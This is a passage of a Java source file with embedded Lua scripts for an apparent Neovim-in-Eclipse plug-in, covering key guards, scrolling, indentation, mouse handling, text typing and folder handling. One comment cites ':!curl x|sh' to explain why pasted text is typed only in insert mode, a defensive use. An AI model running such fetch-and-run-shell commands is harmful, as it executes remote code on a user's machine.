            -- In pcall: Neovim removes an on_key function that fails, and the guard would be gone
            -- from then on. Should the lookup itself fail in a Ctrl-X mode, the key is dropped:
            -- refusing a key wrongly costs a keypress, letting one through runs a command.
            vim.on_key(function(key)
              -- The key itself, or the key behind a modifier prefix (<C-S-v> is \\128\\252, the
              -- modifier's bits, then the same byte).
              local message = (#key == 1 or key:sub(1, 2) == '\\128\\252') and REFUSED[key:sub(-1)] or nil
              if not message then
                return nil
              end
              local mode = vim.api.nvim_get_mode().mode
              if not mode:match('^[iR]v?x$') then
                return nil -- no Ctrl-X mode at all: Ctrl-V, Ctrl-Q and Ctrl-O are their usual selves
              end
              local ok, info = pcall(vim.fn.complete_info, { 'mode' })
              if ok and type(info) == 'table' and info.mode ~= 'ctrl_x' and info.mode ~= 'cmdline'
                  and info.mode ~= 'omni' then
                return nil -- a completion that is over or of another kind: the key ends it, as in Vim
              end
              local in_cmdwin, cmdwin = pcall(vim.fn.getcmdwintype)
              if in_cmdwin and cmdwin == ':' then
                return nil -- the window of : commands: its lines are the user's own commands
              end
              pcall(vim.api.nvim_feedkeys, CTRL_Z, 'ni', false)
              vim.schedule(function()
                vim.notify('neovim4eclipse: ' .. message, vim.log.levels.WARN)
              end)
              return ''
            end, ns)
            return true
            """;

    /**
     * Sends the current window's visible search matches and highlights again ({@link #SEARCH}'s and
     * {@link #HIGHLIGHTS}'s {@code resend}), for the editor just attached or back in Neovim mode,
     * which has none painted (argument: the buffer number). Nothing when that buffer is not in
     * the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in). Each module only when it is on (it is then loaded).
     */
    static final String SEARCH_RESEND = """
            local buf = tonumber((select(1, ...)))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            vim.api.nvim_win_call(win, function()
              for _, name in ipairs({ 'neovim4eclipse.search', 'neovim4eclipse.highlights' }) do
                local m = package.loaded[name]
                if m then
                  m.resend()
                end
              end
            end)
            """;

    /**
     * The lines the editor shows, which {@link #SEARCH} searches, and {@link #HIGHLIGHTS} looks at,
     * along with the window's own (arguments: the buffer number, the first and the last line,
     * 1-based, as strings). Nothing when that buffer is not in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in). Example: with the
     * editor scrolled alone in insert mode (its view is kept, D6), Neovim's window shows lines 1 to
     * 40 and the editor 200 to 240; both ranges are searched, so the editor's lines are highlighted. Each
     * module only when it is on (it is then loaded).
     */
    static final String SEARCH_VIEW = """
            local buf, top, bottom = tonumber((select(1, ...))), tonumber((select(2, ...))), tonumber((select(3, ...)))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            vim.api.nvim_win_call(win, function()
              for _, name in ipairs({ 'neovim4eclipse.search', 'neovim4eclipse.highlights' }) do
                local m = package.loaded[name]
                if m then
                  m.set_view(nil, top, bottom)
                end
              end
            end)
            """;

    /**
     * Sets {@code 'wrap'} (and with it {@code 'linebreak'}, see {@link #VIEWPORT}) in the current
     * window to Eclipse's word wrap (arguments: the buffer number, {@code "1"} for wrap or {@code "0"}).
     * Nothing when that buffer is not in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in): the window shows another editor's document
     * by now, whose own word wrap is sent when it is attached.
     */
    static final String SET_WRAP = """
            local buf, on = tonumber((select(1, ...))), (select(2, ...))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            vim.api.nvim_win_call(win, function()
              require('neovim4eclipse.viewport').set_wrap(on == true or on == 1 or on == '1')
            end)
            """;

    /**
     * Scrolls the current window so that its top line is the editor's (arguments: the buffer number,
     * the 1-based line as a string, and the mode: {@code "keep"}, {@code "drag"} or {@code "show"});
     * see {@link #VIEWPORT}'s {@code set_topline}. Nothing when that buffer is not the
     * current one (the window shows another editor's document by now). Example: the editor shows
     * lines 40 to 60 when it is attached; Neovim's window, which has placed the cursor on line 50, is
     * scrolled to line 40, so that {@code H} goes to line 40.
     */
    static final String SET_TOPLINE = """
            local buf, line, mode = tonumber((select(1, ...))), tonumber((select(2, ...))), (select(3, ...))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf or not line then
              return
            end
            vim.api.nvim_win_call(win, function() require('neovim4eclipse.viewport').set_topline(line, mode) end)
            """;

    /**
     * Scrolls the current window by the mouse wheel (arguments: the buffer number and the lines,
     * positive down, as strings); see {@link #VIEWPORT}'s {@code scroll_lines} and
     * {@code util/WheelScroll}. Nothing when that buffer is not in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in). Example:
     * {@code ("3", "-3")} scrolls three lines up, as {@code 3 Ctrl-Y}.
     */
    static final String SCROLL_LINES = """
            local buf, n = tonumber((select(1, ...))), tonumber((select(2, ...)))
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_buf(win) ~= buf or not n or n == 0 then
              return
            end
            vim.api.nvim_win_call(win, function() require('neovim4eclipse.viewport').scroll_lines(n) end)
            """;

    /**
     * Sets a document's buffer's indentation options (arguments: the buffer's number, tabstop, "1"
     * to indent with tabs, indent width, "1" to follow braces, cinoptions). See
     * {@code util/Indentation} for why. By number, not the current buffer: Neovim may be in a
     * plug-in's float during an attach (lazy.nvim's installer as Neovim starts).
     * {@code 'shiftwidth'} is one indent level, used by {@code >>}, {@code o} and {@code cindent};
     * {@code 'softtabstop'} 0 makes Tab and Backspace in Neovim's insert mode work per character.
     */
    static final String SET_INDENTATION = """
            local buf, tabstop, use_tabs, width, braces, cinoptions = ...
            buf = tonumber(buf)
            if not vim.api.nvim_buf_is_valid(buf) then
              return
            end
            tabstop = tonumber(tabstop)
            if tabstop >= 1 and tabstop <= 64 then
              vim.bo[buf].tabstop = tabstop
              -- Kept for WINDOWS' give_document_back: :help on a document's file sets 'tabstop' 8.
              vim.b[buf].neovim4eclipse_tabstop = tabstop
            end
            vim.bo[buf].expandtab = use_tabs ~= '1'
            vim.bo[buf].shiftwidth = tonumber(width)
            vim.bo[buf].softtabstop = 0
            vim.bo[buf].autoindent = true
            vim.bo[buf].cindent = braces == '1'
            if braces == '1' then
              vim.bo[buf].cinoptions = cinoptions
            end
            """;

    /**
     * Replaces the current buffer's text without an undo step (argument: the lines, as one list;
     * never one argument each, see {@code NeovimApi.execLua}). Setting
     * {@code 'undolevels'} to -1 for one change is Vim's documented way to do that (see
     * {@code :help clear-undo}); it also clears any earlier history. The buffer-local value is put
     * back afterwards, which may be "use the global value" (-123456).
     *
     * <p>Under {@code :lockmarks}: a reused buffer (CREATE_DOCUMENT_BUFFER) keeps its marks from
     * before its editor closed, and replacing all lines would move them. Example: {@code 'a} on line
     * 2 of a reloaded, empty buffer; the one empty line is replaced by four, and {@code 'a} would go
     * to line 5 (docs/design/BUFFER_NUMBERS.md, X10). {@code :lockmarks} takes an Ex command, not a
     * Lua function, so the call runs as {@code :lockmarks lua ...}; that chunk cannot see this
     * script's locals, so the lines wait for it in {@code package.loaded}, out of {@code g:} (where
     * they would be converted to a Vimscript list and back: 35 ms for 200,000 lines, against 13 ms
     * this way).
     */
    static final String LOAD_WITHOUT_UNDO = """
            local saved = vim.bo.undolevels
            vim.bo.undolevels = -1
            package.loaded['neovim4eclipse.load'] = (...)
            local ok, err = pcall(vim.cmd, "lockmarks lua vim.api.nvim_buf_set_lines(0, 0, -1, false, package.loaded['neovim4eclipse.load'])")
            package.loaded['neovim4eclipse.load'] = nil
            vim.bo.undolevels = saved
            if not ok then
              error(err)
            end
            -- Like a file just read: not modified. NeovimSession then sets 'modified' to Eclipse's dirty
            -- flag (an editor with unsaved changes stays modified, so :update writes it).
            vim.bo.modified = false
            """;

    /**
     * Makes a new buffer (argument: its number) a document buffer, which only Eclipse writes. The
     * code and its comments: {@code core/lua/document_buffer.lua}.
     */
    static final String DOCUMENT_BUFFER = LuaModules.script("document_buffer.lua");

    /**
     * Runs normal-mode keys without mappings (argument: the keys), like {@code :normal! keys}. An
     * error ({@code gd} on a blank: "E348: No string under cursor") is shown as Neovim shows it when
     * typed, as an error message, instead of failing the request.
     *
     * <p>{@code pcall} turns the error into a Lua string, prefixed with where it came from
     * ({@code "Vim:E348: ..."}); the {@code gsub} keeps the part from the error number on.
     * {@code nvim_echo}'s {@code err = true} (Neovim 0.11) then shows it the way Neovim shows its own
     * errors: it sets {@code v:errmsg}, uses the {@code ErrorMsg} highlight, and marks the message
     * as an error for a UI ({@code msg_show} kind {@code "echoerr"}). A plain {@code nvim_echo}
     * with the {@code ErrorMsg} highlight would do neither of the last two (its kind is
     * {@code "echomsg"}).
     */
    static final String NORMAL_WITHOUT_MAPPINGS = """
            local keys = ...
            local ok, err = pcall(vim.cmd.normal, { keys, bang = true })
            if not ok then
              local msg = tostring(err):gsub('^.-(E%d+:)', '%1')
              vim.api.nvim_echo({ { msg } }, true, { err = true })
            end
            """;

    /**
     * One mouse event for Neovim's own mouse handling ({@code nvim_input_mouse}): arguments button
     * ({@code "left"}), action ({@code "press"}, {@code "drag"}, {@code "release"}), modifiers
     * ({@code "S"}, {@code "A"}, {@code ""}), line (1-based) and byte column (0-based, both as text) of the
     * character clicked in the document. Returns whether the event was handed to Neovim's mouse.
     *
     * <p><b>Why a script.</b> {@code nvim_input_mouse} takes a <em>screen</em> cell, not a buffer
     * position, and the plug-in draws nothing of Neovim's screen. Neovim's window shows what the
     * editor shows ({@link #VIEWPORT}), but not always: when Neovim's window is scrolled further
     * than Eclipse can scroll (near the end of the document), or while a scroll is on its way. So
     * the script asks Neovim where the
     * character is on its screen ({@code screenpos()}), which also accounts for tabs, wide
     * characters and wrapped lines. A character that is not on Neovim's screen is brought there:
     * <ul>
     *   <li>a press scrolls Neovim's window to it (the cursor goes there anyway);</li>
     *   <li>a drag in visual mode moves the cursor there, which extends the selection as the drag
     *       would (scrolling first would move the cursor and lose the drag's start);</li>
     *   <li>the first drag, before visual mode started, goes to the nearest edge of Neovim's screen,
     *       so the selection starts where the press was; the next drag event extends it.</li>
     * </ul>
     *
     * <p>Clicking past the end of a line points at the cell after its last character, as a click
     * there does in Neovim: after all of its cells ({@code screenpos()}'s {@code endcol}), so a line
     * that ends in a Tab or a wide character such as {@code 中} still gets the cursor after it in
     * insert mode, and a visual drag there takes it in. Without the mouse ({@code 'mouse'} lacks {@code n} or {@code v}, or
     * {@code a}) a press only moves the cursor, as the plug-in did before it forwarded the mouse.
     *
     * <p>Example: {@code ("left", "press", "", 250, 5)} with Neovim showing lines 1 to 38 scrolls
     * its window to line 250 and presses there; three presses within {@code 'mousetime'} select the
     * line ({@code V}), as in Neovim. Visual-mode letters are built with {@code string.char}: a Java
     * text block would read a backslash escape as octal.
     */
    static final String MOUSE = """
            local button, action, mods, lnum, col = ...
            lnum, col = tonumber(lnum), tonumber(col) -- the plug-in passes every argument as text
            local m = vim.o.mouse
            local visual = vim.fn.mode():match('^[vVsS' .. string.char(22, 19) .. ']') ~= nil
            if not (m:find('a') or m:find(visual and 'v' or 'n')) then
              if action == 'press' and button == 'left' then
                vim.api.nvim_win_set_cursor(0, { lnum, col })
              end
              return false
            end
            local function cell(l, c)
              local len = #vim.fn.getline(l)
              local past = len > 0 and c >= len
              local pos = vim.fn.screenpos(0, l, len == 0 and 1 or math.min(c, len - 1) + 1)
              if pos.row == 0 then
                return nil
              end
              if not past then
                return pos.row - 1, pos.col - 1
              end
              -- The cell after the last character: endcol is its last cell (1-based), so endcol is
              -- the next one 0-based. A Tab or a wide character takes more than one cell; for
              -- "ab<Tab>" the Tab is cells 2..7, and cell 3 would put the cursor before the Tab.
              -- Kept inside the window: a line that fills it would point at the window beside.
              local win = vim.fn.getwininfo(vim.api.nvim_get_current_win())[1]
              return pos.row - 1, math.min(pos.endcol, win.wincol - 1 + win.width - 1)
            end
            local row, scol = cell(lnum, col)
            if not row then
              if action == 'press' then
                vim.fn.winrestview({ topline = lnum, lnum = lnum, col = col })
              elseif visual then
                vim.api.nvim_win_set_cursor(0, { lnum, col })
                if action == 'drag' then
                  return true
                end
              else
                local edge = lnum > vim.fn.line('w$') and vim.fn.line('w$') or vim.fn.line('w0')
                lnum, col = edge, 0
              end
              row, scol = cell(lnum, col)
              if not row then
                return false
              end
            end
            vim.api.nvim_input_mouse(button, action, mods, 0, row, scol)
            return true
            """;

    /**
     * Types argument 1 as raw characters into Neovim's open insert, with no mapping or abbreviation
     * applied ({@code nvim_feedkeys(text, "n", true)}: {@code "<"} is a {@code <}, Neovim's special
     * byte 0x80 is escaped), and returns {@code true}; or types nothing and returns {@code false} when
     * Neovim is not in Insert or Replace mode. The re-typing of what Eclipse typed
     * ({@link KeyInput}), which the user's {@code inoremap jk <Esc>} or {@code iabbrev teh the} must
     * not change.
     *
     * <p><b>Why the mode check.</b> The text is whatever Eclipse typed: a paste from a web page, a
     * template's text. In Normal mode the same characters are commands, so a pasted
     * {@code :!curl x|sh} followed by a newline would run. Eclipse believes Neovim is still in the
     * insert it opened, and normally it is; but a timer or an autocommand of the user's config may
     * have ended it ({@code stopinsert}), and the plug-in must not turn text into commands then. The
     * check runs in the same request as the typing, when Neovim is idle, so the mode cannot change
     * in between. Nor while the keys are read: Neovim runs timers and other events only once its
     * typeahead is used up. Checked 2026-11-03 with Neovim 0.12.6 and a timer calling
     * {@code stopinsert} every millisecond: 200,000 fed characters all went into the one insert.
     * ({@code nvim_paste}, which never reads text as keys, was tried instead and dropped: in the
     * plug-in's session {@code .} no longer repeated the insert.) {@code mode} starts with {@code i} in Insert mode and its completion submodes
     * ({@code ic}, {@code ix}), with {@code R} in Replace and Virtual Replace ({@code Rv}); after
     * insert-mode {@code Ctrl-O} it is {@code niI}, Normal mode, and nothing is typed.
     */
    static final String TYPE_TEXT = """
            local first = vim.api.nvim_get_mode().mode:sub(1, 1)
            if first ~= 'i' and first ~= 'R' then
              return false
            end
            vim.api.nvim_feedkeys(select(1, ...), 'n', true)
            return true
            """;

    /** Pastes argument 1 at the cursor, in any mode, as a paste rather than typed keys. */
    static final String PASTE = "vim.api.nvim_paste(select(1, ...), false, -1)";

    /**
     * Moves Neovim out of folder argument 1 and everything under it, before Eclipse deletes or
     * closes the project there, and returns how many working folders it moved (0 when none was in
     * it). Each working folder inside it, the global one ({@code :cd}), a tab page's ({@code :tcd})
     * and a window's ({@code :lcd}), becomes the folder's parent; the others stay as they are.
     *
     * <p>Why: Neovim's process works in the current window's folder, the attached editor's project
     * (set when its window opens, {@link #OPEN_WINDOW}), and Windows does not delete a folder a process works in: deleting
     * that project failed with "The process cannot access the file because it is being used by
     * another process".
     *
     * <p>How: each scope's folder is read first and set again afterward where it changed, because
     * setting the global or a tab page's folder also drops the current window's own one
     * ({@code chdir(dir, 'global')} acts as {@code :cd}). A folder outside is left alone when it
     * did not change: it may be gone already (a project deleted earlier), and {@code :lcd} to it
     * would fail with E344. {@code nvim_win_call} sets another window's folder without entering it.
     * Paths are compared by {@link #PATHS}'s rule: on Windows {@code C:\Work\app} and
     * {@code c:/work/app} are one folder, and a folder reached through a link or junction is the
     * folder it points to. Example:
     * the window works in {@code /ws/app/src}; leaving {@code /ws/app} moves it to {@code /ws}.
     */
    static final String LEAVE_FOLDER = """
            local folder = ...
            local paths = require('neovim4eclipse.paths') -- PATHS: case, links, separators
            local inner = paths.canonical(folder)
            local function inside(dir)
              return paths.within(paths.canonical(dir), inner)
            end
            local refuge = vim.fs.dirname(vim.fs.normalize(folder))
            local function kept(dir) return inside(dir) and refuge or dir end
            local moved = 0
            local tabs, wins = {}, {}
            for _, tab in ipairs(vim.api.nvim_list_tabpages()) do
              local tabnr = vim.api.nvim_tabpage_get_number(tab)
              if vim.fn.haslocaldir(-1, tabnr) == 1 then
                tabs[#tabs + 1] = { tab, vim.fn.getcwd(-1, tabnr) }
              end
              for _, win in ipairs(vim.api.nvim_tabpage_list_wins(tab)) do
                local winnr = vim.fn.win_id2tabwin(win)[2]
                if vim.fn.haslocaldir(winnr, tabnr) == 1 then
                  wins[#wins + 1] = { win, vim.fn.getcwd(winnr, tabnr) }
                end
              end
            end
            if inside(vim.fn.getcwd(-1, -1)) then
              vim.fn.chdir(refuge, 'global')
              moved = moved + 1
            end
            -- Sets one scope's folder, unless it already is that (a folder outside, which may be gone
            -- by now: setting it again would fail with E344).
            local function set(win, command, scope_cwd, dir)
              local target = kept(dir)
              if inside(dir) then moved = moved + 1 end
              vim.api.nvim_win_call(win, function()
                if scope_cwd() ~= dir or target ~= dir then
                  -- chdir(), not :tcd/:lcd, which would expand `...` in the name as a shell command
                  pcall(vim.fn.chdir, target, command == 'tcd' and 'tabpage' or 'window')
                end
              end)
            end
            for _, t in ipairs(tabs) do
              set(vim.api.nvim_tabpage_get_win(t[1]), 'tcd', function() return vim.fn.getcwd(-1, 0) end, t[2])
            end
            for _, w in ipairs(wins) do
              set(w[1], 'lcd', function() return vim.fn.haslocaldir() == 1 and vim.fn.getcwd() or '' end, w[2])
            end
            return moved
            """;

    static final String GET_CLIPBOARD_OPTION = "return vim.o.clipboard";

    /** Evaluates the Vim expression in argument 1 ({@code bufnr('a.txt')}) and returns its value. */
    static final String EVAL = "return vim.fn.eval(select(1, ...))";

    /**
     * Which of the plug-in's {@code init.lua} settings are set, for the problem report
     * ({@code util/ProblemReport}). Argument: the names, without {@code g:}. Answers a list of
     * {@code {"vim.g.<name>", value}} pairs, the value as {@code vim.inspect} prints it, for the set
     * ones only. Example: {@code ({"neovim4eclipse_folds", "neovim4eclipse_task_tags"})} with
     * {@code vim.g.neovim4eclipse_folds = 0} answers {@code {{"vim.g.neovim4eclipse_folds", "0"}}}.
     * A list of pairs, not a table by name: an empty Lua table reaches Java as a list.
     */
    static final String INIT_SETTINGS = """
            local set = {}
            for _, name in ipairs((...)) do
              local value = vim.g[name]
              if value ~= nil then
                set[#set + 1] = { 'vim.g.' .. name, vim.inspect(value) }
              end
            end
            return set
            """;

    /**
     * Registers {@code :checkhealth neovim4eclipse} in the editing Neovim ({@link HealthCheck}):
     * run once at start of each Neovim, after the user's config, so the folder is appended once.
     * The code and its comments: {@code core/lua/health.lua}.
     */
    static final String HEALTH_CHECK = LuaModules.script("health.lua");
    /**
     * Neovim's status line of each editor's window, for the row the editor draws under its text
     * ({@code editor/StatusLineRow}; docs/ARCHITECTURE.md, "The status line in the editor"). The
     * code and its comments: {@code core/lua/statusline.lua}.
     */
    static final String STATUS_LINE = LuaModules.script("statusline.lua");
}
